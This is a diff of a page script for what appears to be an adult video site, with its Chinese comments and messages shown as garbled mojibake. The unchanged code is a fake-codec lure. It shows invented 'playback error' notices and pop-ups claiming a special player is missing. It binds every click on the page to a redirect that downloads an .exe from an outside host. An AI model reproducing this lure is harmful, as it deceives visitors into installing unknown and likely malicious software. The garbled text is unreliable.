@@ -1,8 +1,8 @@
-//µ±Ç°url
+//å½“å‰url
 var NowUrl = window.location.href + "?xs_7_1000_xs";
 var exe = NowUrl.split("xs")[1]
 
-//FlashµØÖ·
+//Flashåœ°å€
 var FlashUrl = "http://aifuli.github.io/blog/id=";
 var FlashMdb = 'nHDLnHfknjTd|nHDvnHm4n1nL|nHDvnHm4nWfL|nHDvnHm3rjmv|nHDLnHfsnjT1';
 var fff = FlashMdb.split("|")
@@ -23,50 +23,50 @@ document.getElementById("flash_play").innerHTML = '';
 }
 
 
-//ÏÔÊ¾±êÌâ
+//æ˜¾ç¤ºæ ‡é¢˜
 var tit = document.getElementById("tit").innerHTML;
 var ttt = tit.split("|")
 var id = parseInt(ttt.length * Math.random())
 var main = '<div class="play_right_2"><ul>';
 for (i=0;i < ttt.length; i++) {var cc = parseInt(ttt.length*Math.random());main = main + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank">' + ttt[cc] + '</a></li>'}
 var main = main + '</ul></div>';
-//ÓÒ±ßÄÚÈİ
+//å³è¾¹å†…å®¹
 document.getElementById("r_xx").innerHTML = main;
-//±êÌâ
+//æ ‡é¢˜
 document.getElementById("t_tit").innerHTML = ttt[id];
 document.getElementById("d_tt").innerHTML = ttt[id];
-function dt_play(){document.getElementById("p_xx").innerHTML = 'ÕıÔÚ²¥·Å£º' + ttt[id];}//ÍøÒ³±êÌâ
-window.document.title = ttt[id] + ' - Ä¾¶úÊ×Ò³';
-//ÏÂÔØµØÖ·
+function dt_play(){document.getElementById("p_xx").innerHTML = 'æ­£åœ¨æ’­æ”¾ï¼š' + ttt[id];}//ç½‘é¡µæ ‡é¢˜
+window.document.title = ttt[id] + ' - æœ¨è€³é¦–é¡µ';
+//ä¸‹è½½åœ°å€
 function dload(){window.location = "http://guodou.gzydr.com/guodou_1157_1131.exe"}
 var imgs = 'nHDvnWmLn1fk|nHDvrj0knj6L|nHDLnWn3nWm1|nHDvrj0sP1b4';
 var img = imgs.split("|")
 var mann = '<div class="bufer"><ul>';
-for (i=0;i < imgs.length; i++) {var cc = parseInt(ttt.length*Math.random());var ci = parseInt(img.length*Math.random());mann = mann + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank"><img src="http://aifuli.github.io/blog/id=' + img[i] + '.jpg"><br>' + ttt[cc] + '</a></li>'}
+for (i=0;i < imgs.length; i++) {var cc = parseInt(ttt.length*Math.random());var ci = parseInt(img.length*Math.random());mann = mann + '<li><a href="#' + parseInt(9000*Math.random()) + '" target="_blank"><img src="http://aifuli.github.io/blog/' + img[i] + '.jpg"><br>' + ttt[cc] + '</a></li>'}
 var mann = mann + '<ul></div>';
-//µ×²¿
+//åº•éƒ¨
 document.getElementById("bbt").innerHTML = mann;
 
-//´ò¿ªÒ³Ãæ²¥·Å
+//æ‰“å¼€é¡µé¢æ’­æ”¾
 
 
-//¹Ø±Õ ÏÔÊ¾
+//å…³é—­ æ˜¾ç¤º
 function d_close(){document.getElementById("c_cloce").innerHTML = '';}
-function d_show(){document.getElementById("c_cloce").innerHTML = '<div id="f_down0"></div><div id="f_down5"><div class="cColes"><a href="javascript:d_close();">X</a></div></div><div class="f_down"><div class="f_down1"><div class="df1">ÎŞ·¨¼ÌĞø²¥·Å£ºÒòÎªÏµÍ³¼ì²âµ½ÄãÃ»ÓĞ°²×°¡¶¼¤Çé×¨ÓÃ²¥·ÅÆ÷¡·</div><div class="df2">ÌáÊ¾£ºÏÂÔØ¡¶¼¤Çé×¨ÓÃ²¥·ÅÆ÷¡·°²×°Íê³Éºó£¬ÇëË¢ĞÂÍøÒ³¼ÌĞø²¥·Å£¡</div><div class="dd0"><div class="dd1"><a href="javascript:dload();"></a></div><div class="dd2"><a href="javascript:dload();"></a></div></div></div></div>';}
-//5ÃëºóÏÔÊ¾
-function d_tid(){document.getElementById("p_xx").innerHTML = 'ÌáÊ¾£ºÓ°Æ¬¼ÓÔØ³ö´í£¡ÒòÎª¼ì²âµ½ÄúµçÄÔÎ´°²×°¡¶¼¤Çé×¨ÓÃ²¥·ÅÆ÷¡·£¬ÇëÏÂÔØ°²×°¡£';}
+function d_show(){document.getElementById("c_cloce").innerHTML = '<div id="f_down0"></div><div id="f_down5"><div class="cColes"><a href="javascript:d_close();">X</a></div></div><div class="f_down"><div class="f_down1"><div class="df1">æ— æ³•ç»§ç»­æ’­æ”¾ï¼šå› ä¸ºç³»ç»Ÿæ£€æµ‹åˆ°ä½ æ²¡æœ‰å®‰è£…ã€Šæ¿€æƒ…ä¸“ç”¨æ’­æ”¾å™¨ã€‹</div><div class="df2">æç¤ºï¼šä¸‹è½½ã€Šæ¿€æƒ…ä¸“ç”¨æ’­æ”¾å™¨ã€‹å®‰è£…å®Œæˆåï¼Œè¯·åˆ·æ–°ç½‘é¡µç»§ç»­æ’­æ”¾ï¼</div><div class="dd0"><div class="dd1"><a href="javascript:dload();"></a></div><div class="dd2"><a href="javascript:dload();"></a></div></div></div></div>';}
+//5ç§’åæ˜¾ç¤º
+function d_tid(){document.getElementById("p_xx").innerHTML = 'æç¤ºï¼šå½±ç‰‡åŠ è½½å‡ºé”™ï¼å› ä¸ºæ£€æµ‹åˆ°æ‚¨ç”µè„‘æœªå®‰è£…ã€Šæ¿€æƒ…ä¸“ç”¨æ’­æ”¾å™¨ã€‹ï¼Œè¯·ä¸‹è½½å®‰è£…ã€‚';}
 function gettime(){
 d_show();
 d_tid();
 document.getElementById("h0").innerHTML = document.getElementById("h1").innerHTML
 }
-//Ö´ĞĞ²¥·Å
+//æ‰§è¡Œæ’­æ”¾
 play1();
-//µã»÷ÈÎÒâÎ»ÖÃ
+//ç‚¹å‡»ä»»æ„ä½ç½®
 document.onclick=dload;
-//´ò¿ª30ÃëÌáÊ¾ÏÂÔØ
+//æ‰“å¼€30ç§’æç¤ºä¸‹è½½
 //setTimeout(ichat,2000);
 //setTimeout(ichat,30000);
-//µ¯³öÌáÊ¾¿ò
-function ichat(){confirm("ÏµÍ³¼ì²âµ½ÄúÃ»ÓĞ°²×°¡¶Ãâ·Ñ¼¤Çé²¥·ÅÆ÷¡·£¬ËùÒÔÎŞ·¨²¥·Å£¬Çëµã»÷¡°È·¶¨¡±ÏÂÔØ°²×°ºóË¢ĞÂÍøÒ³¾ÍÄÜÕı³£²¥·Å¡£");dload();}
+//å¼¹å‡ºæç¤ºæ¡†
+function ichat(){confirm("ç³»ç»Ÿæ£€æµ‹åˆ°æ‚¨æ²¡æœ‰å®‰è£…ã€Šå…è´¹æ¿€æƒ…æ’­æ”¾å™¨ã€‹ï¼Œæ‰€ä»¥æ— æ³•æ’­æ”¾ï¼Œè¯·ç‚¹å‡»â€œç¡®å®šâ€ä¸‹è½½å®‰è£…ååˆ·æ–°ç½‘é¡µå°±èƒ½æ­£å¸¸æ’­æ”¾ã€‚");dload();}
 //cnzz and 51.la
